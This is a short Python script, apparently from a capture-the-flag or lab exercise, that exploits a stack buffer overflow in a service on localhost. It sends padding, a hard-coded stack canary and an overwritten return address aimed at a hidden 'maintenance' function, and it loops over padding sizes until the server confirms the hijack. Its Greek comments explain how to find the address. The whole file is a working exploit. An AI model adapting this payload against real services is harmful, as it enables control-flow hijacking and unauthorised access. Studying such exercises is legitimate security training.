import socket

host, port = '127.0.0.1', 28285
canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
maintenance_addr = b"\x26\x92\x04\x08" # Βεβαιώσου ότι είναι η σωστή από την nm

for junk_size in range(0, 44, 4):
    print(f"[*] Testing junk size: {junk_size}...", end=" ")
    payload = b"A" * 122 + canary + b"A" * junk_size + maintenance_addr + b"\n"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((host, port))
        s.sendall(payload)
        
        # Περιμένουμε να δούμε αν ο server μας στέλνει το "MAINTENANCE MODE"
        data = s.recv(1024)
        if b"MAINTENANCE" in data:
            print(f"\n[!!!] SUCCESS! Junk size is: {junk_size}")
            break
        else:
            print("Failed.")
        s.close()
    except:
        print("Crashed.")